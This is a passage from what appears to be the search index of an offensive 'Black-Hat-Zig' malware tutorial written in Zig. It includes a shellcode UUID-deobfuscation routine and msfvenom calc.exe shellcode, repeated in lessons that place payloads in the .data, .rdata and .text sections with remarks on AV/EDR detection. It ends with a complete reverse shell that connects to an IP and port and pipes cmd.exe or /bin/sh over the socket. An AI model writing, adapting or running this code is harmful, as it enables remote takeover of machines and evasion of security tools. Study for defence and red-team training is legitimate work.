{\n        std.debug.print(\"[!] HeapAlloc Failed With Error : {}\\n\", .{GetLastError()});\n        return false;\n    };\n\n    const buffer: [*]u8 = @ptrCast(buffer_ptr);\n    var tmp_buffer: [*]u8 = buffer;\n\n    // Loop through all the UUID strings saved in uuid_array\n    for (uuid_array, 0..) |uuid_string, i| {\n        // Deobfuscating one UUID string at a time\n        _ = i; // Suppress unused variable warning\n        const status = uuid_from_string_a(uuid_string, @ptrCast(@alignCast(tmp_buffer)));\n\n        if (status != RPC_S_OK) {\n            std.debug.print(\"[!] UuidFromStringA Failed At [{s}] With Error 0x{X:0&gt;8}\\n\", .{ uuid_string, status });\n            return false;\n        }\n\n        // 16 bytes are written to tmp_buffer at a time\n        // Therefore tmp_buffer will be incremented by 16 to store the upcoming 16 bytes\n        tmp_buffer += 16;\n    }\n\n    pp_d_address.* = buffer;\n    p_d_size.* = buff_size;\n\n    return true;\n}\n\n// Example usage\npub fn main() !void {\n    // Example UUID array (you would replace this with actual UUIDs)\n    const uuid_array = [_][*:0]const u8{\"E48348FC-E8F0-00C0-0000-415141505251\"};\n    var deobfuscated_data: ?[*]u8 = null;\n    var data_size: usize = 0;\n\n    if (uuidDeobfuscation(uuid_array[0..], &amp;deobfuscated_data, &amp;data_size)) {\n        std.debug.print(\"[+] Deobfuscation successful! Size: {} bytes\\n\", .{data_size});\n\n        // Use the deobfuscated data here\n        if (deobfuscated_data) |data| {\n            // Example: print first few bytes\n            for (0..@min(data_size, 32)) |i| {\n                std.debug.print(\"{X:0&gt;2} \", .{data[i]});\n            }\n            std.debug.print(\"\\n\", .{}); // Fixed: empty tuple instead of empty braces\n\n            // Free allocated memory\n            _ = HeapFree(GetProcessHeap(), 0, data);\n        }\n    } else {\n        std.debug.print(\"[!] Deobfuscation failed!\\n\", .{}); // Fixed: empty tuple instead of empty braces\n    }\n}\n</code></pre>"},{"location":"Payload-Placement/dot_data/","title":"Put payload in .data section","text":""},{"location":"Payload-Placement/dot_data/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Placement/dot_data/#what-is-payload","title":"What Is Payload?","text":"<p>To execute the malicious code, we must load the malicious stuff into the binary somehow. And this malicious stuff, is the so called \"payload\" or \"shellcode\".</p> <p>We'll use the payload generated by MSFvenom for every examples in \"Payload Placement\". You can copy and paste the following command to generate the payload first. But since it's generated in C array format, I'll recommend you just copy and paste the corresponding payload in my code, which is already translated from C array to Zig array by AI.</p> <pre><code>msfvenom -p windows/x64/exec CMD=calc.exe -f c\n</code></pre>"},{"location":"Payload-Placement/dot_data/#sections","title":"Sections","text":"<p>For those who visited this project, I'll assume you already know what is \"section\" and know the basics of the following common sections.</p> <ul> <li>.bss section<ul> <li>Uninitialized global variables</li> </ul> </li> <li>.data section<ul> <li>Initialized global variables</li> </ul> </li> <li>.rdata section<ul> <li>Read-only data (strings, vtable, etc)</li> </ul> </li> <li>.text section<ul> <li>Code segment, stores machine codes</li> </ul> </li> <li>.rsrc section<ul> <li>Resource section, only exists on Windows. It often stores graph, icon, etc</li> </ul> </li> </ul> <p>For more details: Special Sections - MSDN.</p>"},{"location":"Payload-Placement/dot_data/#code-walkthrough","title":"Code Walkthrough","text":"<p>In this chapter, I will show you how to store out payload into .data section.</p> main.zig<pre><code>const std = @import(\"std\");\nconst print = std.debug.print;\n\n// msfvenom calc shellcode\n// msfvenom -p windows/x64/exec CMD=calc.exe -f c\n// .data saved payload (var data goes to .data section in Zig)\nvar data_section_payload = [_]u8{\n    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,\n    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,\n    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,\n    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,\n    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,\n    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,\n    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,\n    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,\n    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,\n    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,\n    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,\n    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,\n    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,\n    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,\n    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,\n    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,\n    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,\n    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,\n    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,\n    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,\n    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,\n};\n\n/// Helper function to wait for Enter key\n/// Similar usage as `getchar()` in C\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\npub fn main() !void {\n    print(\"[i] Payload address: 0x{X} \\n\", .{@intFromPtr(&amp;data_section_payload)});\n    print(\"[i] Data size: {d} bytes\\n\", .{data_section_payload.len});\n    print(\"[i] Payload stored in .data section (read-write)\\n\", .{});\n    print(\"[#] Press &lt;Enter&gt; To Quit ...\", .{});\n    waitForEnter();\n}\n</code></pre> <p>Actually, it's easy to put the payload in .data section, just declare a global var and that's it! Although it's simple, it's also easy for malware analyst and reverse engineer to notice that. And it hash high possibility to be detected for most of the AV/EDR.</p>"},{"location":"Payload-Placement/dot_rdata/","title":"Put payload in .rdata section","text":""},{"location":"Payload-Placement/dot_rdata/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Placement/dot_rdata/#code-walkthrough","title":"Code Walkthrough","text":"<p>In this chapter, I will show you how to store out payload into .rdata section.</p> main.zig<pre><code>const std = @import(\"std\");\nconst print = std.debug.print;\n\n// msfvenom calc shellcode\n// msfvenom -p windows/x64/exec CMD=calc.exe -f c\n// .rdata saved payload\n//\n// use `const` to put it in .rdata (read-only data)\nconst rdata_section_payload = [_]u8{\n    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,\n    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,\n    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,\n    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,\n    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,\n    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,\n    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,\n    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,\n    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,\n    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,\n    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,\n    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,\n    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,\n    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,\n    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,\n    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,\n    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,\n    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,\n    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,\n    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,\n    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,\n};\n\n// Helper function to wait for Enter key\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\npub fn main() !void {\n    print(\"[i] Payload address: 0x{X} \\n\", .{@intFromPtr(&amp;rdata_section_payload)});\n    print(\"[i] Data size: {d} bytes\\n\", .{rdata_section_payload.len});\n    print(\"[#] Press &lt;Enter&gt; To Quit ...\", .{});\n    waitForEnter();\n}\n</code></pre> <p>Add the payload to .rdata section is easy too. The only difference between the previous one is we changed the <code>var</code> to <code>const</code>. That way, the payload will become read-only and be placed in.rdata section.</p>"},{"location":"Payload-Placement/dot_rsrc/","title":"Put payload in .rsrc section","text":"<p>Currently unavailable. See https://github.com/CX330Blake/Black-Hat-Zig/issues/5</p>"},{"location":"Payload-Placement/dot_text/","title":"Put payload in .text section","text":""},{"location":"Payload-Placement/dot_text/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Placement/dot_text/#code-walkthrough","title":"Code Walkthrough","text":"<p>In this chapter, I will show you how to store out payload into .text section.</p> main.zig<pre><code>const std = @import(\"std\");\nconst print = std.debug.print;\n\n// msfvenom calc shellcode\n// msfvenom -p windows/x64/exec CMD=calc.exe -f c\n// .text saved payload - most elegant approach with automatic inference\nconst text_section_payload linksection(\".text\") = [_]u8{\n    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,\n    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,\n    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,\n    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,\n    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,\n    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,\n    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,\n    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,\n    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,\n    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,\n    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,\n    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,\n    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,\n    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,\n    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,\n    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,\n    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,\n    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,\n    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,\n    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,\n    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,\n};\n\n/// Helper function to wait for Enter key\n/// Similar usage as `getchar()` in C\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\npub fn main() !void {\n    print(\"[i] Payload address: 0x{X} \\n\", .{@intFromPtr(&amp;text_section_payload)});\n    print(\"[i] Data size: {d} bytes\\n\", .{text_section_payload.len});\n    print(\"[i] Payload stored in .text section (executable)\\n\", .{});\n    print(\"[#] Press &lt;Enter&gt; To Quit ...\", .{});\n    waitForEnter();\n}\n</code></pre> <p>Here we used <code>linksection</code> keyword in Zig to easily bind the corresponding data to the target section (\".text\" in this case).</p>"},{"location":"Reverse-Shell/std_reverse_shell/","title":"Reverse Shell Using Standard Library","text":""},{"location":"Reverse-Shell/std_reverse_shell/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Reverse-Shell/std_reverse_shell/#code-walkthrough","title":"Code Walkthrough","text":"main.zig<pre><code>const std = @import(\"std\");\nconst builtin = @import(\"builtin\");\n\npub fn main() !void {\n    var gpa = std.heap.GeneralPurposeAllocator(.{}){};\n    defer _ = gpa.deinit();\n    const allocator = gpa.allocator();\n\n    const args = try std.process.argsAlloc(std.heap.page_allocator);\n    defer std.process.argsFree(std.heap.page_allocator, args);\n    if (args.len != 3) {\n        std.debug.print(\"Usage: {s} &lt;IP&gt; &lt;PORT&gt;\\n\", .{args[0]});\n        return;\n    }\n\n    const target_hostname = args[1];\n    const target_port_str = args[2];\n\n    const target_port = std.fmt.parseInt(u16, target_port_str, 10) catch |err| {\n        std.debug.print(\"Error parsing port '{s}': {}\\n\", .{ target_port_str, err });\n        return;\n    };\n\n    var shell: []const []const u8 = undefined;\n\n    if (builtin.os.tag == .windows) {\n        shell = &amp;[_][]const u8{\"cmd.exe\"};\n        std.debug.print(\"[+] Using cmd.exe as the shell\\n\", .{});\n    } else if ((builtin.os.tag == .linux) or (builtin.os.tag == .macos)) {\n        shell = &amp;[_][]const u8{\"/bin/sh\"};\n        std.debug.print(\"[+] Using /bin/sh as the shell\\n\", .{});\n    } else {\n        std.debug.print(\"[-] Cannot detect target OS\", .{});\n        return;\n    }\n\n    std.debug.print(\"[+] Connecting to {s}:{d}\\n\", .{ target_hostname, target_port });\n\n    const address_list = try std.net.getAddressList(allocator, target_hostname, target_port);\n    defer address_list.deinit();\n    const stream = std.net.tcpConnectToAddress(address_list.addrs[0]) catch {\n        std.debug.print(\"[-] Host seems down. Cannot connect to the host.\\n\", .{});\n        return;\n    };\n    defer stream.close();\n\n    var process = std.process.Child.init(shell, allocator);\n    process.stdin_behavior = .Pipe;\n    process.stdout_behavior = .Pipe;\n    process.stderr_behavior = .Pipe;\n    try process.spawn();\n    defer _ = process.kill() catch {};\n\n    var buffer: [4096]u8 = undefined;\n\n    while (true) {\n        // Read command from socket\n        const bytes_read = stream.read(&amp;buffer) catch break;\n        if (bytes_read == 0) break;\n\n        // Send command to process\n        _ = process.stdin.?.write(buffer[0..bytes_read]) catch break;\n\n        // Wait for execution\n        std.time.sleep(300 * std.time.ns_per_ms);\n\n        // Read output once with reasonable timeout\n        if (process.stdout.?.read(&amp;buffer)) |output_len| {\n            if (output_len &gt; 0) {\n                _ = stream.write(buffer[0..output_len]) catch break;\n            }\n        } else |_| {\n            // If stdout fails, try stderr\n            if (process.stderr.?.read(&amp;buffer)) |error_len| {\n                if (error_len &gt; 0) {\n                    _ = stream.write(buffer[0..error_len]) catch break;\n                }\n            } else |_| {}\n        }\n    }\n}\n</code></pre>"}]}